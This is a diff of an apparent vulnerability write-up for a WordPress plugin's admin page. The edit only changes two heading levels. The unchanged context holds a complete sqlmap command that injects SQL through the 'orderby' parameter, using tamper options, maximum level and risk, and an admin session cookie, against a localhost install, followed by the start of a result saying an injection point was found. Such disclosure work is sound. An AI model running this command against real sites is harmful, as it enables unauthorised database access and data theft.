@@ -13,7 +13,7 @@
 
 3. Search for the `orderby` parameter.
 
-## SQLMAP COMMAND
+### SQLMAP COMMAND
 
 ```bash
 python3 sqlmap.py -u "https://localhost/wordpress/wp-admin/admin.php?page=tsvg-admin&orderby=TS_VG_Title&order=desc" --batch --dbms=mysql --thread 10 --no-cast --random-agent -v 3 --tamper="between,randomcase,space2comment" --level=5 --risk=3 -p orderby --cookie="wordpress_logged_in_d31d6d9d0bfd834c03c5a471886561f0=admin|1720346143|BXq7Kk6kWE6W8OhFfxRfE1vpFt00m9gRiPafjJPDU1N|0b78b25e2683d7f381967019db82b3f3fd9b06f1524ec128af92a74fe7c68e8f; \
@@ -22,7 +22,7 @@ wordpress_test_cookie=WP Cookie check; \
 wp-settings-time-1=1720173805" --thread 10
 ```
 
-## RESULT
+### RESULT
 
 sqlmap identified the following injection point(s) with a total of 1026 HTTP(s) requests:
 ---
